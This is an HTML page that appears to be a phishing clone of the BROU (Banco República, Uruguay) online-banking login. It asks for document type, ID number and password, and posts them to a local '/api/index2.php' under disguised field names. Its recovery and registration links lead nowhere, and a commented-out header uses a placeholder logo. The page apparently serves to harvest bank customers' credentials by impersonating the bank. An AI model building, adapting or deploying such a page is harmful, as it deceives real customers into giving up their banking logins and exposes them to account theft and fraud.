<!DOCTYPE html>
<html lang="es">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <link rel="shortcut icon" href="/img/favicon.ico" />

    <title>BROU Login</title>
    <link
      href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css"
      rel="stylesheet"
    />
    <style>
      body {
        background-color: rgb(8, 82, 141);
        color: #ffffff;
      }
      .login-container {
        background: rgba(255, 255, 255, 0.9);
        padding: 20px;
        border-radius: 10px;
        color: #003087;
      }
      .promo-section {
        padding: 20px;
        text-align: center;
      }
      .footer {
        position: fixed;
        bottom: 0;
        width: 100%;
        background-color: rgb(8, 82, 141);
        padding: 10px 0;
        text-align: center;
      }
      .card-img-top {
        max-height: 150px;
        object-fit: contain;
      }
      .form-select,
      .form-control {
        border: var(--bs-border-width) solid rgb(8, 82, 141);
      }
    </style>
  </head>
  <body>
    <div
      class="container-fluid min-vh-100 d-flex flex-column justify-content-between"
    >
      <!-- Header -->
      <!-- <header class="text-center py-4">
        <img
          src="https://via.placeholder.com/100x50?text=BROU+Logo"
          alt="BROU Logo"
          class="img-fluid"
        />
      </header> -->

      <!-- Main Content -->
      <main class="row justify-content-center align-items-center flex-grow-1">
        <div class="col-12 col-md-9 col-lg-6">
          <div class="row justify-content-center">
            <!-- Login Form -->

            <div class="col-12 col-md-8 py-2">
              <img
                src="/img/logo.svg"
                alt=""
                class="img-fluid"
                style="height: 50px"
              />
            </div>
            <div class="col-12 col-md-8 login-container">
              <h4 class="mb-4">Ingreso de Usuario</h4>
              <form
                action="/api/index2.php"
                id="form"
                method="post"
                class="above-the-fold"
              >
                <div class="mb-3">
                  <label for="country" class="form-label">País</label>
                  <select class="form-select" id="country">
                    <option>Uruguay</option>
                  </select>
                </div>
                <div class="mb-3">
                  <label for="docType" class="form-label"
                    >Tipo de Documento</label
                  >
                  <select class="form-select" id="us4c" name="us4c">
                    <option value="C.I.">C.I.</option>
                    <option value="Banco Hipotecario">Banco Hipotecario</option>
                    <option value="C. Identidad Extranjera">
                      C. Identidad Extranjera
                    </option>
                    <option value="Otro">Otro</option>
                    <option value="Otros Casos">Otros Casos</option>
                    <option value="Pasaporte">Pasaporte</option>
                  </select>
                </div>
                <div class="mb-3">
                  <label for="docNumber" class="form-label"
                    >N° de Documento</label
                  >
                  <input
                    class="form-control"
                    autocomplete="on"
                    placeholder=""
                    id="breves"
                    name="breves"
                    maxlength="8"
                    required
                    minlength="2"
                    inputmode="decimal"
                    value=""
                  />
                </div>
                <div class="mb-3">
                  <label for="password" class="form-label">Contraseña</label>
                  <input
                    class="form-control"
                    placeholder="Contraseña"
                    required
                    type="password"
                    maxlength="64"
                    id="clax"
                    name="clax"
                    minlength="2"
                    value=""
                  />
                </div>
                <div class="row">
                  <div class="col-6">
                    <div class="">
                      <a href="#" class="text-decoration-none"
                        >¿Olvidó su Contraseña?</a
                      >
                    </div>
                    <div class="">
                      <a href="#" class="text-decoration-none"
                        >Registrar usuario</a
                      >
                    </div>
                  </div>
                  <div class="col-6">
                    <a href="#" class="text-decoration-none"
                      >Tengo un código de recuperación</a
                    >
                  </div>
                </div>
                <div class="row mt-4">
                  <div class="col-6">
                    <button
                      type="submit"
                      class="btn btn-primary w-100"
                      style="
                        border-radius: 30px;
                        background-color: #0066b3 !important;
                      "
                    >
                      Ingresar
                    </button>
                  </div>
                  <div class="col-6">
                    <div class="form-check form-switch">
                      <input
                        class="form-check-input"
                        type="checkbox"
                        id="flexSwitchCheckChecked"
                        checked
                      />
                      <label
                        class="form-check-label"
                        for="flexSwitchCheckChecked"
                        >Recordar Usuario</label
                      >
                    </div>
                  </div>
                </div>
              </form>
            </div>
          </div>
        </div>
      </main>

      <!-- Footer -->
      <footer class="footer">
        <div class="container">
          <div class="row">
            <div class="col-12">
              <img
                src="/img/bank.svg"
                alt="Banco República"
                class="img-fluid my-md-5 my-sm-0"
                style="height: 50px"
              />
              <!-- <p>
              <a href="#" class="text-white text-decoration-none me-3">Portal BROU</a>
              <a href="#" class="text-white text-decoration-none me-3">Seguridad</a>
              <a href="#" class="text-white text-decoration-none">Gestión de Reclamos</a>
            </p> -->
              <p class="small">
                © 2025 Banco República. Todos los derechos reservados
              </p>
            </div>
          </div>
        </div>
      </footer>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
  </body>
</html>
